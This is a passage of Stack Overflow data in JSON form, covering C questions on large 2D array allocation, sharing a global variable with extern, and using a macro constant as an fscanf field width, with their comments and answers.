"creation_date": 1498080082, "post_id": 44685986, "comment_id": 76357006, "body": "@kaylum Thank you for the link. But I still need a way to define large 2D arrays in my program."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498080120, "post_id": 44685986, "comment_id": 76357020, "body": "It&#39;s a rare situation when you absolutely need an array. Sometimes you can have another data structure. And for some reason I smell an XY-problem here."}, {"owner": {"reputation": 97, "user_id": 8196386, "user_type": "registered", "profile_image": "https://graph.facebook.com/10155757235758455/picture?type=large", "display_name": "Ash", "link": "https://stackoverflow.com/users/8196386/ash"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498080179, "post_id": 44685986, "comment_id": 76357042, "body": "@Olaf If I use a pointer to a 1D array, how many elements do you think I can have in my array? Can I handle 40M elements? Regarding to the enough memory available, the article says that the memory allocation can fail because of the other reasons as well."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498080232, "post_id": 44685986, "comment_id": 76357060, "body": "FWIW: 50k * 50k <code>long</code> are 20GB memory on a POSIX64 system, i.e. 2.5G elements. How do you think it is 40M? And why should that not work? And yes, it can fail. And the computer can explode, you can get a cold. your keyboard can break. I don&#39;t see your point. As a sidenote: your pointer-pointer stuff uses quite some more memory than a 2D array."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498080551, "post_id": 44685986, "comment_id": 76357193, "body": "And that is no matter of what &quot;I think&quot;, but the system you use! Too bad you don&#39;t give any relevant information in your question. I tend to agree with @EugeneSh. this is an XY problem."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1498080578, "post_id": 44685986, "comment_id": 76357205, "body": "just curious, what are you doing that requires so much memory?"}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1498080825, "post_id": 44685986, "comment_id": 76357293, "body": "You <i>think</i> you need a large 2d array. Suggest you look at the problem differently. Eg improve your data structures and algorithm to remove that &quot;need&quot;. You&#39;d do better to ask about the underlying problem that makes you think you need such a large block of memory."}, {"owner": {"reputation": 97, "user_id": 8196386, "user_type": "registered", "profile_image": "https://graph.facebook.com/10155757235758455/picture?type=large", "display_name": "Ash", "link": "https://stackoverflow.com/users/8196386/ash"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498081154, "post_id": 44685986, "comment_id": 76357420, "body": "@Olaf When I said does it work, I meant is this the right way to tackle large size arrays in C. What more information do you want me to add to the question?"}, {"owner": {"reputation": 97, "user_id": 8196386, "user_type": "registered", "profile_image": "https://graph.facebook.com/10155757235758455/picture?type=large", "display_name": "Ash", "link": "https://stackoverflow.com/users/8196386/ash"}, "reply_to_user": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1498081320, "post_id": 44685986, "comment_id": 76357491, "body": "@yano I am developing an algorithm for load flow analysis in power system. Depending on the system size, I need to build quite few large arrays in the program."}, {"owner": {"reputation": 97, "user_id": 8196386, "user_type": "registered", "profile_image": "https://graph.facebook.com/10155757235758455/picture?type=large", "display_name": "Ash", "link": "https://stackoverflow.com/users/8196386/ash"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1498081492, "post_id": 44685986, "comment_id": 76357554, "body": "@kaylum I agree with you but for the thing I am trying to do, I need a 2D array. Unless I use a 1D array and a pointer to eliminate the need for 2D array. Should check this method as well."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1498081674, "post_id": 44685986, "comment_id": 76357613, "body": "oh ok. Well I don&#39;t know the details of how virtual memory and swap space work, but if your OS is telling it doesn&#39;t have that much memory, upgrade your box or try a different OS. Otherwise, you&#39;ll have to implement some kind of buffered system.. perhaps a double buffer or ring buffer where you read in a partial amount of data, operate on it, write it off somewhere (to file, to the network), then read in the next chunk, etc. Treat it as real-time data processing, for which there is no conceivable end (streaming video for instance)."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1498081694, "post_id": 44685986, "comment_id": 76357623, "body": "Then the answer is simple. It can&#39;t be done. If you insist on the need for doing something beyond the limits of the system then that&#39;s not possible. And don&#39;t repeat the <i>assertion</i> that other scientific apps do that - that is not based on fact. Other apps do handle large data sets. But it&#39;s not with large arrays."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498081937, "post_id": 44685986, "comment_id": 76357724, "body": "Are you working on a 32-bit or 64-bit machine?  If you&#39;re using a 64-bit machine, are you compiling your code for 64-bit operation?  Have you looked at the values from <code>ulimit -a</code>?  How much space are you allowed to allocate.  On a 32-bit machine, you&#39;re on a hiding to nothing.  On a 64-bit machine, you can perhaps create multi-gigabyte arrays, if you have enough physical memory.  If you don&#39;t have enough physical memory, you&#39;re likely to get into all sorts of ghastly techniques involving files used as backing store and (very, very, very) slow access via functions that page data into memory."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498082417, "post_id": 44685986, "comment_id": 76357919, "body": "&quot;Unless I use a 1D array and a pointer to eliminate the need for 2D array.&quot; - Did you even read my comments? That does not &quot;eliminate the need for a 2D array&quot;, but it <b>is</b> a 2D array. What you have <b>is not a 2D array</b>. And we are no clairvoyants! If you ask if the C standard disallows such large arrays, the answer is &quot;No!&quot;. Wrt to the standard you could allocate a 2TiB*2TiB or larger array. <b>If your implementation and environment support it</b>."}], "owner": {"reputation": 97, "user_id": 8196386, "user_type": "registered", "profile_image": "https://graph.facebook.com/10155757235758455/picture?type=large", "display_name": "Ash", "link": "https://stackoverflow.com/users/8196386/ash"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 96, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1498079932, "creation_date": 1498078020, "last_edit_date": 1498079932, "question_id": 44685986, "link": "https://stackoverflow.com/questions/44685986/large-dynamic-2d-array-allocation-fails-c-language", "title": "Large dynamic 2D array allocation fails - C language", "body": "<p>I am trying to define a large dynamic size 2D array in C. When the array size is not very big (e.g. 20,000 x 20,000), memory allocation works perfectly. However, when the array size is greater than 50K x 50K memory allocation fails. Here is the sample code.</p>\n\n<pre><code>long int i = 0;\nint **Cf = calloc(30000, sizeof *Cf);\nfor( i = 0; i &lt; 30000; i++){\nCf[i] = calloc(30000, sizeof *(Cf[i]));}\n</code></pre>\n\n<p>The <a href=\"https://stackoverflow.com/questions/745152/what-is-the-maximum-size-of-buffers-memcpy-memset-etc-can-handle\">What is the maximum size of buffers memcpy/memset etc. can handle?</a> post has explained why this issue occurs. However, it does not say what to do when you need large dynamic 2D arrays in your program. I am sure there should be an efficient way of doing this since many scientific applications need this feature. Any suggestion? </p>\n"}, {"tags": ["c", "global-variables", "software-design"], "comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 1, "creation_date": 1498077973, "post_id": 44685928, "comment_id": 76356002, "body": "Yes, you could assign it to a global variable."}, {"owner": {"reputation": 3178, "user_id": 434376, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/f05b4dbd51a871d5815108c92d0c0623?s=128&d=identicon&r=PG", "display_name": "eat_a_lemon", "link": "https://stackoverflow.com/users/434376/eat-a-lemon"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1498078083, "post_id": 44685928, "comment_id": 76356061, "body": "@oliver so in my main program I could allocate the global struct. And then I would be able to reference it even in other source files?"}, {"owner": {"reputation": 2912, "user_id": 3081206, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YaKOY.jpg?s=128&g=1", "display_name": "takendarkk", "link": "https://stackoverflow.com/users/3081206/takendarkk"}, "edited": false, "score": 0, "creation_date": 1498078188, "post_id": 44685928, "comment_id": 76356123, "body": "Why don&#39;t you just try it and see?"}, {"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 1, "creation_date": 1498078256, "post_id": 44685928, "comment_id": 76356162, "body": "It sounds like your question is really &quot;how do I use global variables?&quot;.  But if so, then the appropriate advice would be to read a <a href=\"https://stackoverflow.com/questions/562303/the-definitive-c-book-guide-and-list\">good introductory book on C</a>."}], "answers": [{"comments": [{"owner": {"reputation": 3178, "user_id": 434376, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/f05b4dbd51a871d5815108c92d0c0623?s=128&d=identicon&r=PG", "display_name": "eat_a_lemon", "link": "https://stackoverflow.com/users/434376/eat-a-lemon"}, "edited": false, "score": 0, "creation_date": 1498078154, "post_id": 44685994, "comment_id": 76356105, "body": "What about separate files?  How would the separate files know of its existence?"}], "tags": [], "owner": {"reputation": 66610, "user_id": 2411320, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/5kF5N.jpg?s=128&g=1", "display_name": "gsamaras", "link": "https://stackoverflow.com/users/2411320/gsamaras"}, "is_accepted": false, "score": 0, "last_activity_date": 1498082758, "last_edit_date": 1498082758, "creation_date": 1498078077, "answer_id": 44685994, "question_id": 44685928, "link": "https://stackoverflow.com/questions/44685928/c-cross-cutting-concern-in-c-global-variable/44685994#44685994", "title": "C cross cutting concern in C global variable", "body": "<p>Yes you can do that in C, just define the global memory allocator at the top of the file, and everything below it will know its existence.</p>\n\n<p>In order for other files to have an eye on it, use <code>extern</code>, as explained in <a href=\"https://stackoverflow.com/questions/6792930/how-do-i-share-a-global-variable-between-c-files\">How do I share a global variable between c files?</a></p>\n\n<p>Keep in mind though that global variables should be avoided when possible.</p>\n"}, {"tags": [], "owner": {"reputation": 3178, "user_id": 434376, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/f05b4dbd51a871d5815108c92d0c0623?s=128&d=identicon&r=PG", "display_name": "eat_a_lemon", "link": "https://stackoverflow.com/users/434376/eat-a-lemon"}, "is_accepted": true, "score": 0, "last_activity_date": 1498084603, "creation_date": 1498084603, "answer_id": 44687317, "question_id": 44685928, "link": "https://stackoverflow.com/questions/44685928/c-cross-cutting-concern-in-c-global-variable/44687317#44687317", "title": "C cross cutting concern in C global variable", "body": "<p>I removed the extern keyword and made a globals.h file with the declaration for object_tracker. I included it every \"class\" file and it works.  I am still not sure what the extern keyword is used for.</p>\n"}, {"comments": [{"owner": {"reputation": 3178, "user_id": 434376, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/f05b4dbd51a871d5815108c92d0c0623?s=128&d=identicon&r=PG", "display_name": "eat_a_lemon", "link": "https://stackoverflow.com/users/434376/eat-a-lemon"}, "edited": false, "score": 0, "creation_date": 1498134830, "post_id": 44689822, "comment_id": 76381885, "body": "object_tracker is defined globally in test_file.h but the extern keyword caused a problem so I removed it and everything worked."}, {"owner": {"reputation": 73, "user_id": 1222534, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a6c831947e1e1cba9d875f44b19000f?s=128&d=identicon&r=PG", "display_name": "Pra", "link": "https://stackoverflow.com/users/1222534/pra"}, "reply_to_user": {"reputation": 3178, "user_id": 434376, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/f05b4dbd51a871d5815108c92d0c0623?s=128&d=identicon&r=PG", "display_name": "eat_a_lemon", "link": "https://stackoverflow.com/users/434376/eat-a-lemon"}, "edited": false, "score": 0, "creation_date": 1498186385, "post_id": 44689822, "comment_id": 76407158, "body": "The code line &#39;[code] extern struct Object_Tracker* object_tracker;&#39; does not defined variable. It says compiler that there is variable &#39;object_tracker&#39; defined in somewhere so go ahead with compilation. Since there is no such variable linker fail. But when you remove &#39;extern&#39; that line change to a variable definition. So as you mentioned the issue dissappear."}, {"owner": {"reputation": 73, "user_id": 1222534, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a6c831947e1e1cba9d875f44b19000f?s=128&d=identicon&r=PG", "display_name": "Pra", "link": "https://stackoverflow.com/users/1222534/pra"}, "reply_to_user": {"reputation": 3178, "user_id": 434376, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/f05b4dbd51a871d5815108c92d0c0623?s=128&d=identicon&r=PG", "display_name": "eat_a_lemon", "link": "https://stackoverflow.com/users/434376/eat-a-lemon"}, "edited": false, "score": 0, "creation_date": 1498188678, "post_id": 44689822, "comment_id": 76407662, "body": "Please refer [link] (<a href=\"http://www.cprogramming.com/declare_vs_define.html\" rel=\"nofollow noreferrer\">cprogramming.com/declare_vs_define.html</a>) has good example on declaration and definition."}], "tags": [], "owner": {"reputation": 73, "user_id": 1222534, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8a6c831947e1e1cba9d875f44b19000f?s=128&d=identicon&r=PG", "display_name": "Pra", "link": "https://stackoverflow.com/users/1222534/pra"}, "is_accepted": false, "score": 0, "last_activity_date": 1498103550, "creation_date": 1498103550, "answer_id": 44689822, "question_id": 44685928, "link": "https://stackoverflow.com/questions/44685928/c-cross-cutting-concern-in-c-global-variable/44689822#44689822", "title": "C cross cutting concern in C global variable", "body": "<p>According to your example there is no variable \u2018object_tracker\u2019 defined globally. You have define such variable, but it is inside main function. </p>\n\n<pre><code>struct Object_Tracker* object_tracker = Object_Tracker_Create();//Inside main function ???\n</code></pre>\n\n<p>Since it is defined inside main function is it not visible to other functions.\nSo move this definition to global scope. The updated test_main.c is as below.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"object_tracker.h\"\n#include \"test_file.h\"\n\nstruct Object_Tracker* object_tracker; //Global scope variable\n\nint main(int argc, char* argv[]) {\n\n        object_tracker = Object_Tracker_Create(); //Assign value for the variable\n        struct Test* test = Test_Create();\n        Test_Destroy(test);\n        printf(\"heello\\n\");\n\n}\n</code></pre>\n"}], "owner": {"reputation": 3178, "user_id": 434376, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/f05b4dbd51a871d5815108c92d0c0623?s=128&d=identicon&r=PG", "display_name": "eat_a_lemon", "link": "https://stackoverflow.com/users/434376/eat-a-lemon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 44687317, "answer_count": 3, "score": 1, "last_activity_date": 1498103550, "creation_date": 1498077773, "last_edit_date": 1498080178, "question_id": 44685928, "link": "https://stackoverflow.com/questions/44685928/c-cross-cutting-concern-in-c-global-variable", "title": "C cross cutting concern in C global variable", "body": "<p>I have two cross cutting concerns in my design of my software. The memory allocator tracks memory usage in its struct(class) member variables. I also have a logger. Right now I am passing the logger and the allocator into the constructor of my objects. I can maintain a reference to them but then I would have to do that in every struct(class) I create. It would be nice if they were global but I am not sure how to do that in C. Can I construct a global memory allocator that will correctly keep track of bytes used without passing it in to my functions calls to reference?</p>\n\n<p>EDIT:\nI am trying to use object_tracker as a global variable in my create and destroy functions.  When I compile and test the files below this is the result I get:  How do I use extern correctly to get the global reference to work?</p>\n\n<pre><code>gcc -I ../include object_tracker.c test_file.c test_main.c -o test\n./test\n\n/tmp/ccuT8Z1A.o: In function `Test_Create':\ntest_file.c:(.text+0xb): undefined reference to `object_tracker'\n/tmp/ccuT8Z1A.o: In function `Test_Destroy':\ntest_file.c:(.text+0x4b): undefined reference to `object_tracker'\ncollect2: error: ld returned 1 exit status\n</code></pre>\n\n<p>test_file.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include \"object_tracker.h\"\n#include \"test_file.h\"\n\nstruct Test* Test_Create() {\n        struct Test* test = (struct Test*)Object_Tracker_Obj_Alloc(object_tracker, 1, sizeof(struct Test));\n        test-&gt;foobar = 10;\n        return test;\n}\n\nvoid Test_Destroy(struct Test* test) {\n        if(test != NULL) {\n                Object_Tracker_Obj_Free(object_tracker, test);\n        }\n}\n</code></pre>\n\n<p>test_file.h</p>\n\n<pre><code>#ifndef _TEST_FILE_H_\n#define _TEST_FILE_H_\n\n#include \"object_tracker.h\"\n\nextern struct Object_Tracker* object_tracker;\n\nstruct Test {\n        int foobar;\n};\n\nstruct Test* Test_Create();\nvoid Test_Destroy(struct Test* test);\n\n#endif\n</code></pre>\n\n<p>test_main.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"object_tracker.h\"\n#include \"test_file.h\"\n\nint main(int argc, char* argv[]) {\n\n        struct Object_Tracker* object_tracker = Object_Tracker_Create();\n        struct Test* test = Test_Create();\n        Test_Destroy(test);\n        printf(\"heello\\n\");\n\n}\n</code></pre>\n"}, {"tags": ["c", "macros", "scanf", "c89"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498078785, "post_id": 44685730, "comment_id": 76356432, "body": "@weather-vane Your deleted answer was off by 1.  size vs length issue."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1498078850, "post_id": 44685730, "comment_id": 76356474, "body": "@chux: it was missing a cast too: <code>(rsize_t)(MAX_NAME_LEN + 1)</code>, or better <code>sizeof(name)</code>."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1498079106, "post_id": 44685730, "comment_id": 76356581, "body": "@WeatherVane: your deleted answer is useful: <code>fscanf_s</code> is not C89, but it is obviously available on the most common non C99 compiler: MSVC."}, {"owner": {"reputation": 1582, "user_id": 3185943, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/TJBWJ.png?s=128&g=1", "display_name": "blackghost", "link": "https://stackoverflow.com/users/3185943/blackghost"}, "edited": false, "score": 0, "creation_date": 1498079429, "post_id": 44685730, "comment_id": 76356725, "body": "agreed, it might be useful for others looking for the same answer."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1498080060, "post_id": 44685730, "comment_id": 76356997, "body": "<a href=\"https://stackoverflow.com/questions/1621394/\">How to prevent <code>scanf()</code> causing a buffer overflow?</a> recommends the &#39;ungainly as all get out&#39; solution because it works, more or less regardless of how <code>MAX_NAME_LEN</code> expands.  Almost any other solution puts limits on the permissible/acceptable values (expansions) of <code>MAX_NAME_LEN</code>.  It depends on how general and robust you need the code to be.  If you only need it to work with your code at the moment, you can hack together a string with the macro value.  If you need a general solution, then you probably need the <code>sprintf()</code> method."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498078252, "post_id": 44685953, "comment_id": 76356158, "body": "Curious, is <code>#X</code> valid for C89?"}, {"owner": {"reputation": 15898, "user_id": 1155000, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/b8213d9cd920e864ce8ff1fdeefe4db5?s=128&d=identicon&r=PG", "display_name": "Daniel Kamil Kozar", "link": "https://stackoverflow.com/users/1155000/daniel-kamil-kozar"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1498078731, "post_id": 44685953, "comment_id": 76356408, "body": "@chux : Yes, <code>str(s)</code> and <code>xstr(s)</code> (defined in the same way as <a href=\"https://gcc.gnu.org/onlinedocs/gcc-3.4.3/cpp/Stringification.html\" rel=\"nofollow noreferrer\">here</a>) are given as examples in section 6.8.3.5."}, {"owner": {"reputation": 1582, "user_id": 3185943, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/TJBWJ.png?s=128&g=1", "display_name": "blackghost", "link": "https://stackoverflow.com/users/3185943/blackghost"}, "edited": false, "score": 4, "creation_date": 1498079312, "post_id": 44685953, "comment_id": 76356673, "body": "One sharp stick -- you need to ensure that <code>MAX_NAME_LEN</code> defines a literal number (it cannot be a calculation, so <code>#define MAX_NAME_LEN (255-2)</code> would not work)."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1498079425, "post_id": 44685953, "comment_id": 76356723, "body": "Furthermore, <code>MAX_NAME_LEN</code> must be written in base 10: <code>0x100</code> will not work either, nor will <code>20L</code>..."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498079536, "post_id": 44685953, "comment_id": 76356773, "body": "Suggest showing <code>name[]</code> declaration like <code>name[MAX_NAME_LEN + 1];</code> as the +1 is important."}, {"owner": {"reputation": 1582, "user_id": 3185943, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/TJBWJ.png?s=128&g=1", "display_name": "blackghost", "link": "https://stackoverflow.com/users/3185943/blackghost"}, "edited": false, "score": 0, "creation_date": 1498079734, "post_id": 44685953, "comment_id": 76356867, "body": "Yes, putting <code>()</code> around it constitutes a calculation... in my mind anyways :-)."}], "tags": [], "owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "is_accepted": false, "score": 5, "last_activity_date": 1498079868, "last_edit_date": 1498079868, "creation_date": 1498077865, "answer_id": 44685953, "question_id": 44685730, "link": "https://stackoverflow.com/questions/44685730/how-do-i-use-a-defined-constant-as-the-max-field-width-in-fscanf/44685953#44685953", "title": "How do I use a #defined constant as the max field width in fscanf?", "body": "<p>You can use this macro:</p>\n\n<pre><code>#define STRINGIFY(X) INDIRECT(X)\n#define INDIRECT(X) #X\n</code></pre>\n\n<p>like this:</p>\n\n<pre><code>#define MAX 10\nputs(\"%\"STRINGIFY(MAX)\"d\");\n</code></pre>\n\n<p>which will print <code>%10d</code>.</p>\n\n<p>In your case it would be</p>\n\n<pre><code>char name[MAX_NAME_LEN + 1];\nfscanf(input, \"%\"STRINGIFY(MAX_NAME_LEN)\"s\", name);\n</code></pre>\n\n<p>The <code>#</code> in the macro stringifies (makes <code>\"</code> around it) whatever is after it. So the macro must be the decimal number only.<br>\nThe level of indirection is needed to expand <code>MAX_NAME_LEN</code> to <code>256</code>. <code>INDIRECT(MAX_NAME_LEN)</code> would expand to <code>\"MAX_NAME_LEN\"</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 15898, "user_id": 1155000, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/b8213d9cd920e864ce8ff1fdeefe4db5?s=128&d=identicon&r=PG", "display_name": "Daniel Kamil Kozar", "link": "https://stackoverflow.com/users/1155000/daniel-kamil-kozar"}, "edited": false, "score": 0, "creation_date": 1498078128, "post_id": 44685996, "comment_id": 76356091, "body": "There is a perfectly valid solution posted in mch&#39;s answer."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 15898, "user_id": 1155000, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/b8213d9cd920e864ce8ff1fdeefe4db5?s=128&d=identicon&r=PG", "display_name": "Daniel Kamil Kozar", "link": "https://stackoverflow.com/users/1155000/daniel-kamil-kozar"}, "edited": false, "score": 2, "creation_date": 1498078487, "post_id": 44685996, "comment_id": 76356276, "body": "@DanielKamilKozar 2 issues to cope when switching to <code>fgets()</code> that are not mentioned/addressed here: A  <code>+ 2</code> buffer needed (<code>\\n</code> and <code>\\0</code>) and that <code>fgets()</code> saves white-space, unlike <code>&quot;%s&quot;</code>."}], "tags": [], "owner": {"reputation": 941, "user_id": 6061216, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/sRsZ4.png?s=128&g=1", "display_name": "DevilaN", "link": "https://stackoverflow.com/users/6061216/devilan"}, "is_accepted": false, "score": 0, "last_activity_date": 1498078081, "creation_date": 1498078081, "answer_id": 44685996, "question_id": 44685730, "link": 